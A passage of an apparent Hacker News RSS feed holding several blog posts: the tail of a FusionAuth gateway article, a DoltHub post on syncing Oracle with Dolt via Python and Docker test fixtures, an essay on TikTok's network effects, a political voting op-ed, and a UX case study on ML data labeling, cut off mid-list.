  <span>const</span> <span>stateValue</span> <span>=</span> <span>Math</span><span>.</span><span>random</span><span>().</span><span>toString</span><span>(</span><span>36</span><span>).</span><span>substring</span><span>(</span><span>2</span><span>,</span><span>15</span><span>)</span> <span>+</span> <span>Math</span><span>.</span><span>random</span><span>().</span><span>toString</span><span>(</span><span>36</span><span>).</span><span>substring</span><span>(</span><span>2</span><span>,</span><span>15</span><span>)</span> <span>+</span> <span>Math</span><span>.</span><span>random</span><span>().</span><span>toString</span><span>(</span><span>36</span><span>).</span><span>substring</span><span>(</span><span>2</span><span>,</span><span>15</span><span>)</span> <span>+</span> <span>Math</span><span>.</span><span>random</span><span>().</span><span>toString</span><span>(</span><span>36</span><span>).</span><span>substring</span><span>(</span><span>2</span><span>,</span><span>15</span><span>)</span> <span>+</span> <span>Math</span><span>.</span><span>random</span><span>().</span><span>toString</span><span>(</span><span>36</span><span>).</span><span>substring</span><span>(</span><span>2</span><span>,</span><span>15</span><span>)</span> <span>+</span> <span>Math</span><span>.</span><span>random</span><span>().</span><span>toString</span><span>(</span><span>36</span><span>).</span><span>substring</span><span>(</span><span>2</span><span>,</span><span>15</span><span>);</span>
  <span>re…</span></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fusionauth.io/blog/2020/09/15/microservices-gateway">https://fusionauth.io/blog/2020/09/15/microservices-gateway</a></em></p>]]>
            </description>
            <link>https://fusionauth.io/blog/2020/09/15/microservices-gateway</link>
            <guid isPermaLink="false">hacker-news-small-sites-24548895</guid>
            <pubDate>Mon, 21 Sep 2020 21:56:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Syncing Oracle to Dolt Using Python]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24548870">thread link</a>) | @oscar-batori
<br/>
September 21, 2020 | https://www.dolthub.com/blog/2020-09-20-oracle-support-in-sql-sync/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-09-20-oracle-support-in-sql-sync/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p><a href="https://github.com/liquidata-inc/dolt">Dolt</a> is a relational database with Git-like version control features. In particular the underlying data storage format is a commit graph, and each commit represents the complete state (schema and data) of the database at a point in time. <a href="https://github.com/liquidata-inc/doltpy">Doltpy</a>, our Python API, provides users with tools to easily move data between their existing databases and Dolt. This post covers adding support for Oracle. We wanted to support Oracle because several customers asked for it. Given how widely adopted it is as a database solution, this is not surprising. Supporting Oracle proved more complicated than the other databases. Most of that complexity comes from Oracle having a model that differs substantially from Postgres and MySQL, as well as how long the database takes to actually startup. We cover how to abstract away this complexity in a clean test fixture in the final section using Docker.</p>
<h3>Overview</h3>
<p>Let's start with the goal: we want to provide a simple API for moving data from Dolt to Oracle, or from Oracle to Dolt. Let's say we want to get data from the <code>revenue_estimates</code> table in Oracle into Dolt for versioning, we want to write code like this:</p>
<div data-language="python"><pre><code><span>from</span> doltpy<span>.</span>etl<span>.</span>sql_sync <span>import</span> sync_from_dolt<span>,</span> get_dolt_target_writer<span>,</span> get_oracle_source_reader

sync_to_dolt<span>(</span>get_oracle_source_reader<span>(</span>oracle_engine<span>)</span><span>,</span>
             get_dolt_target_writer<span>(</span>dolt_repo<span>)</span><span>,</span>
             <span>{</span><span>'revenue_estimates'</span><span>:</span> <span>'revenue_estimates'</span><span>}</span></code></pre></div>
<p>We need some objects for managing database connections, which are defined as follows:</p>
<div data-language="python"><pre><code><span>from</span> doltpy<span>.</span>core <span>import</span> Dolt
<span>import</span> sqlalchemy <span>as</span> sa
<span>import</span> cx_Oracle


dolt <span>=</span> Dolt<span>.</span>init<span>(</span><span>'my-org/estiamtes'</span><span>)</span>
dolt<span>.</span>sql_server<span>(</span><span>)</span>

engine <span>=</span> create_engine<span>(</span><span>'oracle+cx_oracle://'</span><span>,</span> creator<span>=</span>_oracle_connection_helper<span>)</span>
<span>def</span> _oracle_connection_helper<span>:</span>
    <span>return</span> cx_Oracle<span>.</span>connect<span>(</span><span>'oracle_user'</span><span>,</span> <span>'oracle_pwd'</span><span>,</span> <span>'{}:{}/{}'</span><span>.</span><span>format</span><span>(</span><span>'oracle_host'</span><span>,</span> <span>1521</span><span>,</span> <span>'oracle_db'</span><span>)</span><span>)</span></code></pre></div>
<p>In order to incorporate Oracle into our SQL Sync tooling we need to verify that we can "round trip" data from Dolt to Oracle, and from Oracle to Dolt. We do the same for Postgres and MySQL. In practice this means we need instances of each of these databases running, and available to our test harness. The most repeatable and portable way we have found is to use <code>pytest-docker</code> to run a containerized instance of each database implementation. The architecture looks something like this:
<span>
      <a href="https://www.dolthub.com/blog/static/379407ef35fdd1dadd387ba867a0ae9c/ef9e5/sql_sync_test_architecture.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="SQL Sync test architecture" title="SQL Sync test architecture" src="https://www.dolthub.com/blog/static/379407ef35fdd1dadd387ba867a0ae9c/ef9e5/sql_sync_test_architecture.png" srcset="https://www.dolthub.com/blog/static/379407ef35fdd1dadd387ba867a0ae9c/a48b3/sql_sync_test_architecture.png 214w,
https://www.dolthub.com/blog/static/379407ef35fdd1dadd387ba867a0ae9c/47730/sql_sync_test_architecture.png 428w,
https://www.dolthub.com/blog/static/379407ef35fdd1dadd387ba867a0ae9c/ef9e5/sql_sync_test_architecture.png 607w" sizes="(max-width: 607px) 100vw, 607px" loading="lazy">
  </a>
    </span></p>
<p>To achieve this we need three things:</p>
<ol>
<li>a Docker image available that stands up an Oracle instance</li>
<li>augment our test harness to run that image, and populate it with a test table</li>
<li>code to execute and test the sync</li>
</ol>
<p>We will examine them in reverse order, starting with the implementation, as that's closest to the user value the feature delivers.</p>
<h2>Implementation</h2>
<p>Once Oracle was incorporated into our test harness, actually reading and writing from it was straightforward, and done via SQL Alchemy. We focus on the issues caused by how SQL Alchemy maps between higher level types and Oracle types. One main benefit of SQL Alchemy is the <a href="https://docs.sqlalchemy.org/en/13/core/tutorial.html">SQL Expression Language</a> that abstracts over multiple database implementations, something we <a href="https://www.dolthub.com/blog/2020-08-24-schema-support-in-sql-sync/">blogged</a> about. In most cases this takes care of translating between database implementation specific types by providing a higher level set of types. A concrete example is how this higher level expression language allows us to use a single definition of a test table, making our code cleaner and more readable, as well as reducing database implementation specific boilerplate:</p>
<div data-language="python"><pre><code><span>from</span> sqlalchemy<span>.</span>types <span>import</span> Integer<span>,</span> DateTime<span>,</span> String<span>,</span> Text<span>,</span> Float<span>,</span> Date

TEST_TABLE_METADATA <span>=</span> Table<span>(</span>TABLE_NAME<span>,</span>
                            MetaData<span>(</span><span>)</span><span>,</span>
                            Column<span>(</span><span>'first_name'</span><span>,</span> String<span>(</span><span>256</span><span>)</span><span>,</span> primary_key<span>=</span><span>True</span><span>)</span><span>,</span>
                            Column<span>(</span><span>'last_name'</span><span>,</span> String<span>(</span><span>256</span><span>)</span><span>,</span> primary_key<span>=</span><span>True</span><span>)</span><span>,</span>
                            Column<span>(</span><span>'playing_style_desc'</span><span>,</span> Text<span>)</span><span>,</span>
                            Column<span>(</span><span>'win_percentage'</span><span>,</span> Float<span>)</span><span>,</span>
                            Column<span>(</span><span>'high_rank'</span><span>,</span> Integer<span>)</span><span>,</span>
                            Column<span>(</span><span>'turned_pro'</span><span>,</span> DateTime<span>)</span><span>,</span>
                            Column<span>(</span><span>'date_of_birth'</span><span>,</span> Date<span>)</span><span>)</span></code></pre></div>
<p>In the snippet above <code>engine</code> is a SQL Alchemy object that manages a database connection pool. Passing that engine to a call to create the table we just defined will execute the generated query against the corresponding database instance. This is exactly what we do to create a test table in our containerized Oracle instance:</p>
<div data-language="text"><pre><code>TEST_TABLE_METADATA.metadata.create_all(engine)</code></pre></div>
<p>The type mapping issue arises because SQL Alchemy translates both <code>sqlalchemy.types.Date</code> and <code>sqlalchemy.types.DateTime</code> to Oracle's <code>DATE</code> type. This is clearly a bug, as this amounts to "destructive" type coercion, and in fact the library should not permit writes of <code>datetime.datetime</code> Python objects to <code>DATE</code> without at least warning the user of information loss. We plan to implement fixes to SQL Alchemy, and push them back to that project as a wider benefit to the community.</p>
<p>For the purposes of using the data sync, however, this is not an issue. This code is purely for creating a test table, and we do not yet support schema sync in Oracle. We work around this in our test suite.</p>
<h3>Test Harness</h3>
<p>In order for us to execute the SQL Alchemy expressions above, we need to incorporate a running Docker image that exposes an Oracle instance to our test harness. We launch our containers via <code>pytest-docker</code>, a <code>pytest</code> plugin that wraps <code>docker-compose</code>. This allows us to define Docker services using dictionaries which are in turn translated into YAML:</p>
<div data-language="python"><pre><code><span>@pytest<span>.</span>fixture</span><span>(</span>scope<span>=</span><span>'session'</span><span>)</span>
<span>def</span> <span>docker_compose_file</span><span>(</span>tmpdir_factory<span>,</span> mysql_service_def<span>,</span> postgres_service_def<span>,</span> oracle_service_def<span>)</span><span>:</span>
    compose_file <span>=</span> tmpdir_factory<span>.</span>mktemp<span>(</span><span>'docker_files'</span><span>)</span><span>.</span>join<span>(</span><span>'docker-compose.yml'</span><span>)</span>

    compose_conf <span>=</span> <span>{</span>
        <span>'version'</span><span>:</span> <span>'2'</span><span>,</span>
        <span>'services'</span><span>:</span> <span>{</span>
            <span>'mysql'</span><span>:</span> mysql_service_def<span>,</span>
            <span>'postgres'</span><span>:</span> postgres_service_def<span>,</span>
            <span>'oracle'</span><span>:</span> oracle_service_def
        <span>}</span>
    <span>}</span>

    <span>with</span> compose_file<span>.</span><span>open</span><span>(</span><span>'w'</span><span>)</span> <span>as</span> f<span>:</span>
        yaml<span>.</span>dump<span>(</span>compose_conf<span>,</span> stream<span>=</span>f<span>)</span>

    <span>return</span> compose_file<span>.</span>strpath</code></pre></div>
<p>Note that this fixture itself depends on a test fixture called <code>oracle_service_def</code> which specifies how to launch the Oracle service definition. Again, this fixture returns a dictionary, which is incorporated into <code>docker_compose_file</code> as follows:</p>
<div data-language="python"><pre><code><span>@pytest<span>.</span>fixture</span><span>(</span>scope<span>=</span><span>'session'</span><span>)</span>
<span>def</span> <span>oracle_service_def</span><span>(</span><span>)</span><span>:</span>
    <span>return</span> <span>{</span>
        <span>'image'</span><span>:</span> <span>'oscarbatori/oracle-database:18.4.0-xe-quick'</span><span>,</span>
        <span>'container_name'</span><span>:</span> ORACLE_CONTAINER_NAME<span>,</span>
        <span>'ports'</span><span>:</span> <span>[</span><span>'{port}:{port}'</span><span>.</span><span>format</span><span>(</span>port<span>=</span>ORACLE_LISTENER_PORT<span>)</span><span>,</span>
                  <span>'{port}:{port}'</span><span>.</span><span>format</span><span>(</span>port<span>=</span>ORACLE_OEM_EXPRESS_PORT<span>)</span><span>]</span>
    <span>}</span></code></pre></div>
<p>In the following section we detail how to get an Oracle image that takes a reasonable amount of time to start (around a minute). That is still too slow for <code>pytest</code> which will throw errors when our fixtures for fetching a SQL Alchemy engine object run. We can put some retry logic around those calls to make the fixture swallow errors for some reasonable period of time until it obtains a connection:</p>
<div data-language="python"><pre><code><span>@pytest<span>.</span>fixture</span>
<span>def</span> <span>oracle_engine</span><span>(</span>docker_ip<span>,</span> docker_services<span>)</span> <span>-</span><span>&gt;</span> Engine<span>:</span>
    engine <span>=</span> create_engine<span>(</span><span>'oracle+cx_oracle://'</span><span>,</span> creator<span>=</span><span>lambda</span><span>:</span> _oracle_connection_helper<span>(</span>docker_ip<span>)</span><span>)</span>

    <span>@retry</span><span>(</span>delay<span>=</span><span>10</span><span>,</span> tries<span>=</span><span>12</span><span>,</span> exceptions<span>=</span><span>(</span>sqlalchemy<span>.</span>exc<span>.</span>DatabaseError<span>)</span><span>)</span>
    <span>def</span> <span>verify_connection</span><span>(</span><span>)</span><span>:</span>
        conn <span>=</span> engine<span>.</span>connect<span>(</span><span>)</span>
        conn<span>.</span>close<span>(</span><span>)</span>
        <span>return</span> engine

    <span>return</span> verify_connection<span>(</span><span>)</span>


<span>def</span> <span>_oracle_connection_helper</span><span>(</span>host<span>)</span><span>:</span>
    <span>return</span> cx_Oracle<span>.</span>connect<span>(</span>ORACLE_USER<span>,</span> ORACLE_PWD<span>,</span> <span>'{}:{}/{}'</span><span>.</span><span>format</span><span>(</span>host<span>,</span> ORACLE_LISTENER_PORT<span>,</span> ORACLE_DB<span>)</span><span>)</span></code></pre></div>
<p>Our test harness is now augmented to fire up a service running an instance of Oracle XE. In order to get this container running we needed to create the actual image, as unlike Postgres and MySQL, there was not a freely available on one on Docker Hub.</p>
<h2>Building an Image</h2>
<p>Up until this point we have assumed the instance of an Oracle image. This proved a little tricky in practice. We found a GitHub repository containing some tools for building images <a href="https://github.com/oracle/docker-images/tree/master/OracleDatabase/SingleInstance">here</a>. We cloned the repo, and ran the following from the appropriate subdirectory:</p>
<div data-language="text"><pre><code>$ /buildDockerImage.sh -v 18.4.0 -x</code></pre></div>
<p>After about twenty minutes, this produced an image that we could then use to run a container in our development in environment, in this case locally on OSX:</p>
<div data-language="text"><pre><code>$ docker run --name test_oracle \
-p 1521:1521 -p 5500:5500 \
-e ORACLE_PWD=oracle_password \
oracle/database:18.4.0-xe</code></pre></div>
<p>Unfortunately, it takes about 15 minutes for the Oracle database to get into a state were it is accepting connections. This is far too slow for a test suite, as it would make a single test run take more than fifteen minutes. Slow tests discourage developers from using them, increasing the the likelihood of error. Fortunately, Docker provides functionality for creating an image from a running container (credit to <a href="https://www.dolthub.com/blog/2020-09-20-oracle-support-in-sql-sync/(https://medium.com/@ggajos/drop-db-startup-time-from-45-to-3-minutes-in-dockerized-oracle-19-3-0-552068593deb)%20for%20inspiration">this blog post</a>. The following command creates a snapshot of the container we fired up in our dev environment in the previous step:</p>
<div data-language="text"><pre><code>$ docker commit --author "Oscar Batori me@my-email.com" --message "Fast Oracle XE snapshot" oscarbatori/oracle-database:18.4.0-xe-quick</code></pre></div>
<p>The image could then be started as follows:</p>
<div data-language="text"><pre><code>docker run --name test_oracle \
-p 1521:1521 -p 5500:5500 \
-e ORACLE_PWD=oracle_password \
oscarbatori/oracle-database:18.4.0-xe-quick</code></pre></div>
<p>We now had an image that could present stand up a running Oracle instance in under a minute, allowing us to build the test harness and tests detailed above on top of it.</p>
<h2>Conclusion</h2>
<p>In this post we covered how we incorporated Oracle into our <code>doltpy.etl.sql_sync</code>, a module of the Dolt's Python API, Doltpy, that provides utilities to users who would like to use Dolt alongside existing relational database solutions. We hope that by supporting Oracle we will vastly increase the number of users who are able to capture the benefits for a version controlled SQL database while not having to abandon their existing tools. We have a full SQL Sync guide in our <a href="https://www.dolthub.com/docs/guides/sql-sync/">documentation</a>.</p></div></div>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-09-20-oracle-support-in-sql-sync/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24548870</guid>
            <pubDate>Mon, 21 Sep 2020 21:53:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TikTok network effects not singularly attributable to algorithm]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24548774">thread link</a>) | @melon625
<br/>
September 21, 2020 | http://jmohsenin.com/tiktok-strategy | <a href="https://web.archive.org/web/*/http://jmohsenin.com/tiktok-strategy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p>TikTok’s algorithm must have the best PR in all of tech: a prevalent view is that it’s the singular magic behind TikTok’s success:</p>

<blockquote><p lang="en" dir="ltr">Total disagreement on my timeline right now as to whether the value of TikTok is 100 percent in its algorithm, or 100 percent in its user base. Where do you land? (I'm more and more convinced that it's the user base) [POLL]</p>— Casey Newton (@CaseyNewton) <a href="https://twitter.com/CaseyNewton/status/1305216706546225152?ref_src=twsrc%5Etfw">September 13, 2020</a></blockquote>


<p>With the news that the TikTok/Oracle <a href="https://www.scmp.com/economy/china-economy/article/3101362/tiktoks-algorithm-not-sale-bytedance-tells-us-source">won’t include the algorithm</a> and the possibility that Oracle will have to replace it, some have concluded that TikTok’s popularity will flatline, that it’s only a matter of time before Facebook eats their lunch via Instagram Reels. But despite Facebook’s previous success at cloning the competition, TikTok is a much more formidable challenge: they’ve built strong network effects on top of a unique graph that Facebook doesn’t have –&nbsp;one built on niche interests and esoterica rather than people you know or recognize. Historically, social products have been extremely durable to competition because of network effects, even more so when the graph is unique – Facebook being a prime example. Take the algorithm out of TikTok and it’ll certainly be hampered, but pure algorithmic advantages aren’t that strong of a moat: best practices dissipate through industry quickly, and most of what makes ML good in the first place is the underlying training data generated by user activity.</p>

<p>If network effects are what keeps TikTok on top today, is the algorithm responsible for getting TikTok here in the first place? The answer is a lot more complex than that.</p>

<h2 id="tiktoks-virtuous-cycle">TikTok’s Virtuous Cycle</h2>

<p><img src="http://jmohsenin.com/assets/images/tiktok-cycle.png" alt="TikTok's Virtuous Cycle"></p>

<p>To understand TikTok’s strategy, Michael Porter’s framework is a useful guide. In his seminal <a href="https://hbr.org/1996/11/what-is-strategy">“What Is Strategy?” paper</a> (<a href="https://www.slideshare.net/hitnrun10/what-is-strategy-30278968">non-paywall slide summary</a>), he laid out a framework for what defines a successful strategy:</p>

<ul>
  <li><strong>Strategy relies on unique activities</strong>: the essence of strategy is choosing to <em>do</em> different things and not just rely on general operational effectiveness, which is easily copyable.</li>
  <li><strong>Strategic strength comes from the fit between unique activities:</strong> the unique activities need to be compatible, and ideally compound, such that the total value of all of them is larger than the sum of its parts.</li>
  <li><strong>Activities must require tradeoffs</strong>: some activities are incompatible with each other, while others are a large opportunity cost. If neither is true about the activities a company chooses, a competitor can engage in those same activities with little downside.</li>
</ul>

<p>When a strategy is successful, it often forms a virtuous cycle: the activities compound  in a powerful feedback loop that causes the product to improve at a faster and faster rate. What is TikTok’s virtuous cycle? First, let’s look at some of their activities:</p>

<ul>
  <li>Videos are short, making them easy to consume and to make</li>
  <li>Most videos people watch are made by creators they don’t know in real life (family/friends) or recognize (influencers/brands)</li>
  <li>Videos are primarily distributed by an algorithm instead of by a follow graph</li>
  <li>TikTok’s UX (auto-playing videos watched one at a time) generates rich signal for every video watched, helping the algorithm learn a person’s preferences quickly (to be expanded on in a future post)</li>
  <li>Music is remixable and the main way trends get started and grow</li>
</ul>

<p>Not every activity is unique to TikTok –&nbsp;videos on Instagram are short, YouTube distributes videos algorithmically –&nbsp;but how those activities fit together and compound is unique to TikTok:</p>

<ul>
  <li>ML algorithms like TikTok’s suffer from <a href="https://en.wikipedia.org/wiki/Cold_start_(recommender_systems)">the cold start problem</a>: it’s difficult to make good predictions about what you will like before you use it. The videos on TikTok are short, so it’s easy for consumers to watch many of them at once, and their UX provides rich signal about every video.</li>
  <li>If the videos are short, you need a lot of it to fill the <a href="https://www.fastcompany.com/90395898/is-tiktok-a-time-bomb">45 minutes per day the average person spends on TikTok</a>. Making consumers follow enough creators to fill up a feed would be extremely cumbersome, so instead TikTok pulls in creators from everywhere in the main “For You” page. This is only possible because the algorithm can quickly learn about consumer’s preferences via the rich signal from short videos.</li>
  <li>How do creators know what kinds of videos to make, and how will the find an audience? Remixable music provides a signal of demand about what consumers want to watch and provides context and an audience for a creator to riff off of, <a href="https://www.tiktok.com/music/Mi-Pan-Su-Sus-6833400908727061253">no matter how weird</a>.</li>
</ul>

<p>The compounding strength of this strategy is made crystal clear when you consider how frictionless it is for both creators and consumers to have a great experience on TikTok, and how that only gets better as TikTok gets bigger:</p>

<ul>
  <li><strong>Creators</strong>: make videos using music as context, audience, and signal without having to develop an audience first or risk alienation of people you know in real life; as more and more consumers use TikTok, the niches only get deeper and weirder, and the algorithm gets better and better at routing your videos to the right consumers.</li>
  <li><strong>Consumers</strong>: get a great feed experience without having to do any work to find and follow accounts; your feed gets better and better as TikTok gets more data about what you like and creators make more videos for every conceivable niche.</li>
</ul>

<p>This is a strong strategy, but critically, <em>this needs a certain amount of scale to work.</em> When TikTok was much smaller, many of these effects were much weaker. Fewer creators leads to fewer videos to choose from, making TikTok less engaging to consumers. Fewer consumers leads to a smaller potential audience, making it less enticing for creators. How do you solve for this and get to scale quickly, in a landscape as saturated as consumer internet? Paid acquisition. TikTok spent $1b on it throughout 2018 alone, becoming <a href="https://sensortower.com/blog/tiktok-revenue-downloads-2019">the second-most downloaded app in 2019</a>, <a href="https://sensortower.com/blog/tiktok-downloads-2-billion">topping 2 billion downloads by April 2020</a>, and recently announcing they have <a href="https://www.cnbc.com/2020/08/24/tiktok-reveals-us-global-user-growth-numbers-for-first-time.html">100 million MAUs in the US alone, 50% of those DAUs</a>. This is an enormous amount of money to spend on user acquisition and only makes sense if your ARPU exceeds your CAC (unclear for TikTok) and/or you have strong network effects. <a href="https://markets.businessinsider.com/news/stocks/bytedance-60-billion-tiktok-global-us-valuation-2020-9-1029606381">With a rumored valuation in the $60 billion range</a>, it seems that bet paid off.</p>

<h2 id="what-this-means-for-facebook">What This Means for Facebook</h2>

<p>Instagram Reels isn’t going to supplant TikTok by simply cloning a few of its key aspects. TikTok’s activities require tradeoffs that Instagram might not be ready to make. Pushing Instagram creators to make Reels comes at the cost of other content they could make. Pushing Reels in the Home and Explore feeds siphons off consumer attention that would otherwise go to the rest of Instagram. The resulting signals are much messier given the different and competing goals within Instagram, making it harder to train a great algorithm.</p>

<p>Even if Facebook is ready to eat that cost, the experience is still going to be worse than on TikTok: Instagram’s graph doesn’t overlap heavily with TikTok’s, so Instagram’s ability to leverage their graph to jumpstart Reels is limited. TikTok is successful in part because the content is different than Instagram, where you could make and watch weird, funny, unpolished videos you wouldn’t find elsewhere. This is the critical difference that makes the Snapchat/Instagram stories saga non-comparative: Snapchat and Instagram’s graph had very high overlap, such that people could start using Instagram stories with little loss. This is not true of TikTok/Instagram and makes me skeptical that Reels is going to easily displace TikTok. Network effects are just that powerful.</p>

    </div></div>]]>
            </description>
            <link>http://jmohsenin.com/tiktok-strategy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24548774</guid>
            <pubDate>Mon, 21 Sep 2020 21:39:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Autoplay President]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24548701">thread link</a>) | @pbw
<br/>
September 21, 2020 | https://www.kmeme.com/2020/09/the-autoplay-president.html | <a href="https://web.archive.org/web/*/https://www.kmeme.com/2020/09/the-autoplay-president.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-5227427478322203396" itemprop="description articleBody">
<p>I’ve been escaping the COVID and election news cycles the same way many people have, by watching copious amounts of streaming television. I typically like to watch lighter fare, shows that remind me of better times, such as the dystopian alternate history show <i>The Man in the High Castle</i>, where there is no hint of a pandemic.</p><p><a href="https://lh3.googleusercontent.com/-4f4wqytvQRc/X2kZRxC3gZI/AAAAAAAFGfU/jFsndmwbl_oqqvZqfX3c8jURlOxql79WACLcBGAsYHQ/image.png"><img data-original-height="675" data-original-width="1200" height="360" src="https://lh3.googleusercontent.com/-4f4wqytvQRc/X2kZRxC3gZI/AAAAAAAFGfU/jFsndmwbl_oqqvZqfX3c8jURlOxql79WACLcBGAsYHQ/w640-h360/image.png" width="640"></a></p><p>As I finished my second episode yesterday, it was twenty minutes after midnight. My remote control had evidently fallen in the cracks between the cushions of my couch, and before I could locate it the next episode auto-played. I was immediately sucked into the intriguing narrative and I ended up watching two more episodes. I went to bed around 2:30AM.</p>

<p>Netflix added the behavior to automatically play the next episode by default in 2016, when their revenue was already over seven billion dollars a year. Autoplay boosted their numbers by enticing customers into watching more hours of TV. While the viewer is technically free to turn off the screen at any time, the company’s carefully designed choice architecture strongly nudges people into watching just one more episode.</p>

<p>Netflix and other streaming companies don’t mind that customers will sometimes stay up too late watching their shows, and those same customers will sometimes end up bleary eyed the next morning, driving their Hyundais through twisting mountain roads, weaving slightly as they navigate the tight turns in dense but fast-moving traffic.</p>

<p>These corporations prioritize growth over the well-being of their customers because their primary obligation is increasing shareholder value. Despite the fact that many of the people running those companies presumably have families and children, and despite that fact that many of them are surely compassionate people, the company is structurally designed to produce growth at all costs, so that is what the company does.</p><p><a href="https://lh3.googleusercontent.com/-ghKxJj3XB7E/X2kaqHT3TpI/AAAAAAAFGfg/qFEYcL0qGjUtlN74WtsZ-qcOU74Aw8exACLcBGAsYHQ/image.png"><img data-original-height="383" data-original-width="614" height="400" src="https://lh3.googleusercontent.com/-ghKxJj3XB7E/X2kaqHT3TpI/AAAAAAAFGfg/qFEYcL0qGjUtlN74WtsZ-qcOU74Aw8exACLcBGAsYHQ/w640-h400/image.png" width="640"></a></p><p>It might surprise you to learn that the United States is not run by soulless profit seeking corporations. We still live in a democracy, but the problem is not everyone participates fully in the democratic process. Those who don’t participate are essentially turning on presidential autoplay; their next leader will be thrust upon them instead of chosen.</p>

<p>Based on Trump’s improbable incumbency, if enough citizens leave autoplay on, Trump will be our president for another four years. Imagine you are at a restaurant, and you’ve just had a four-year-long meal featuring an unending stream of chaos and hostility. The art on the walls has been torn, there’s smoke billowing out of the kitchen, a number of patrons and staff lie dead on the floor.</p>

<p>Wheeling through this scene of destruction comes the waiter with a dessert cart. Before you can say anything, he picks up one of the desserts and stuffs it into your mouth. If enough people do not vote in November, that is what’s going to happen, the nightmare meal will continue for four more years, maybe longer.</p>

<p>We’ve been stumbling through a brutal year of crises with no end in sight. Leading us is a man-child whose motives are completely unaligned with our current and future needs, and whose temperament would make it difficult for him to successfully manage a Taco Bell. We need to turn autoplay off, we need to vote.</p>

<p>It’s past midnight in America. If we do nothing, we will be watching Trump all night long. We don’t have time for this, we have to go to work in the morning, we have to get up early and start picking through the rubble. This November we need to flip over the dessert cart and storm right out of the restaurant. The country is not a corporation, the country is a democracy, and we need to vote to keep it that way.</p>


</div></div>]]>
            </description>
            <link>https://www.kmeme.com/2020/09/the-autoplay-president.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24548701</guid>
            <pubDate>Mon, 21 Sep 2020 21:30:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UX for Users to Train ML Model Within SaaS Product [Case Study]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24548458">thread link</a>) | @arvando
<br/>
September 21, 2020 | https://www.cakewalklabs.com/blog/2020/9/16/ux-to-entice-users-to-train-saas-machine-learning-model-case-study | <a href="https://web.archive.org/web/*/https://www.cakewalklabs.com/blog/2020/9/16/ux-to-entice-users-to-train-saas-machine-learning-model-case-study">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-6be4fe9c454ee7097fd4"><div><p>I’ve been responsible for the UX and overall Product Design of several web applications that all faced the same issue: In order to improve our machine learning model, we need our users to label information and correct the ML’s output. How do we entice our users to label information in order to train our machine learning models within the user flow without making it feel like work? How do we balance the ML’s initially minimal output with getting users to manually label data?&nbsp;</p><p>I’ve seen this design problem with use cases varying from property management analytics dashboard, to a chatbot analytics dashboard, and most recently with a resume formatting tool for recruiters. This blog post will be a case study of the full design process for a resume formatting tool with a focus on the ML labeling design later in the process.</p><h2>Background</h2><p>This client came to me with an existing web application targeted towards agency recruiters and their support teams. The problem being solved by this web app is that recruiters need to reformat candidates’ resumes all into the same agency-branded template, and sometimes remove any of the candidate’s identifiable information. The status quo of how this is currently done is manually, with a lot of copy-paste from the candidate’s original resume over to the agency’s branded resume template and front-sheet template. Turns out that’s why recruiters who message you on LinkedIn also ask you to type up your resume in a docx format (am I the only one who thought that was weird and annoying?)</p><p>As part of the questions that I asked the client, I discovered that their fully functional existing web application only had users who were friends and family, none of which were active users. Forms of marketing had not been fruitful. As such, I identified the core problems as a lack of user retention, user engagement and therefore a low percentage of users training the ML models.</p><h2>Creative Process</h2><p>I communicated to the client that the approach I take will involve doing a redesign without any constraints to the development, but then will be followed with reeling back the designs to iterate on their existing designs with a focus on what dev work will have the highest impact. As a part of this process, I also emphasized that I won’t be looking at their existing designs until a later point, as I didn’t want it to limit or create a bias in my creative thinking.</p><p>As this was a specialized B2B use case that I fully didn’t understand, since I’ve never worked as a recruiter, I started with User Interviews as a means to gain a deep understanding of the problem the web app is trying to solve and to understand the motivations and goals of the target users.</p><h2>User Interviews</h2><p>The client, who was previously a recruiter and understood the market, naturally seemed confident that most recruiters think as he does and formats resumes like he does.&nbsp; I wanted to see the status quo of how users are solving the problem that the client was trying to automate. I’ve found that with User Discovery Interviews, there is diminishing returns in terms of new information gained after about the 5th interview from the same user segment. Below I’ve included the user interview questions that I asked on the Zoom calls.</p><h3>User Interview Questions and Why</h3><p>I’d like to understand your work-flow of a recruiter’s resume editing process. I will be asking you some questions and watching you perform some work on screen-share. For the questions I ask, I’m looking to understand your perspectives based on your personal experiences in the industry.</p><ol data-rte-list="default"><li><p>Can you show me a typical end to end work-flow of what you do with 1 job candidate, from receiving the email up until you submit it to a client? When you do this, can you please think out loud and narrate what you’re doing, I might interrupt with some questions. [<em>Why?</em> Trying to observe the tasks that may be overlooked or under-reported by the recruiter because they’re so used to it. Observing for key points of frustration or boredom communicated by human error or changes in their tone, rather than words. Digging deeper with questions about why they did certain things the way they did, and questions to lead to what’s important to them.]</p></li><li><p>What is the most frustrating part of this process? [<em>Why?</em> Trying to see if what they verbalize as the most frustrating part matches my observation from the previous steps, as it will reveal the deepest pain point]</p></li><li><p>Are there some parts of this process that you made up yourself, perhaps short cuts, or something to be more efficient? [<em>Why?</em> Usually, if there are any such “hacks”, it makes for a good product feature or selling point.]</p></li><li><p>What do you enjoy most about this process? [<em>Why?</em> This is generally what motivates them to do their job and reveals their motivation, further allowing design centered thinking.]</p></li><li><p>What is your biggest hurdle in achieving success in this process? [<em>Why?</em> This is a higher level question when compared to #2 and allows for further design centered thinking like #4. 